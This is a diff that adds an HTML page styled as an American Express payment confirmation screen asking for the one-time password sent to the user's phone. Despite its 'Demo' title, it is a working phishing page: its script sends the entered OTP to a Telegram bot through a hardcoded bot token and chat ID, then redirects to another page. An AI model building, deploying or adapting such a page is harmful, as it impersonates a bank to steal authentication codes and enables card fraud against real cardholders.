@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Credit Card Validation Demo</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "Segoe UI", Arial, sans-serif;
+}
+
+body {
+    background: linear-gradient(135deg, #eef2f3, #d9e4ec);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Main container */
+.creditCardForm {
+    background: #ffffff;
+    width: 420px;
+    padding: 25px 30px;
+    border-radius: 14px;
+    box-shadow: 0 12px 35px rgba(0,0,0,0.15);
+    position: relative;
+}
+
+/* Card logo */
+#amex {
+    width: 80px;
+    position: absolute;
+    top: 20px;
+    right: 20px;
+}
+
+/* Heading */
+.heading h1 {
+    text-align: center;
+    font-size: 22px;
+    font-weight: 600;
+    color: #222;
+    margin-bottom: 15px;
+}
+
+hr {
+    border: none;
+    border-top: 1px solid #e0e0e0;
+    margin: 15px 0;
+}
+
+/* Details */
+.payment h5 {
+    font-size: 14px;
+    color: #444;
+    margin-bottom: 6px;
+}
+
+/* Section title */
+.payment h3 {
+    font-size: 18px;
+    margin: 20px 0 10px;
+    color: #111;
+}
+
+/* Labels */
+label {
+    font-size: 13px;
+    color: #555;
+    display: block;
+    margin-bottom: 6px;
+}
+
+/* Input */
+.form-control {
+    width: 100%;
+    padding: 12px;
+    font-size: 15px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    outline: none;
+    transition: 0.3s;
+}
+
+.form-control:focus {
+    border-color: #4CAF50;
+    box-shadow: 0 0 0 2px rgba(76,175,80,0.25);
+}
+
+/* Button */
+.button {
+    width: 100%;
+    margin-top: 20px;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    background: linear-gradient(135deg, #4CAF50, #43a047);
+    border: none;
+    color: #fff;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: 0.2s;
+}
+
+.button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 22px rgba(76,175,80,0.4);
+}
+
+/* Footer note */
+.note {
+    text-align: center;
+    font-size: 12px;
+    color: #777;
+    margin-top: 15px;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+    .creditCardForm {
+        width: 95%;
+        padding: 20px;
+    }
+
+    #amex {
+        width: 65px;
+    }
+
+    .heading h1 {
+        font-size: 20px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="creditCardForm">
+
+    <!-- Card Logo -->
+    <img src="amex.jpg" id="amex" alt="AMEX">   
+
+    <div class="heading">
+        <h1>CONFIRM DETAILS</h1>
+    </div>
+
+    <hr>
+
+    <div class="payment">
+        <h5><strong>Merchant:</strong> AMEXpay</h5>
+        <h5><strong>Transaction:</strong> ₹170.00 INR</h5>
+        <h5><strong>Card Number:</strong> xxxx xxxx xxxx xxxx</h5>
+
+        <hr>
+
+        <h3>Authenticate Payment</h3>
+
+        <label>OTP sent to your registered mobile number</label>
+        <label>Enter One Time Password (OTP)</label>
+
+        <form method="post" id="telegramForm"> 
+            <input type="number" id="otp" name="otp" class="form-control" placeholder="Enter OTP" maxlength="6" required>  
+
+         
+                   
+
+            <button type="submit" class="button">Make Payment</button>
+        </form>
+
+        <div class="note">
+            Secured by 256-bit SSL Encryption
+        </div>
+    </div>
+</div>
+
+
+
+
+<script>
+document.getElementById("telegramForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  var otp = document.getElementById("otp").value;  
+
+
+  var botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
+  var chatId = "1308711346";
+
+  var message =
+    " New Form Submission\n\n" +
+    " otp: " + otp;   
+
+  var telegramURL =
+    "https://api.telegram.org/bot" + botToken +
+    "/sendMessage?chat_id=" + chatId +
+    "&text=" + encodeURIComponent(message);
+
+  fetch(telegramURL)
+    .then(response => {
+      // Redirect after sending data
+      window.location.href = "index.html";
+    }) 
+    .catch(error => {
+      alert("Failed to send data");
+    });
+});
+</script>
+
+
+   
+
+
+
+</body>
+</html>
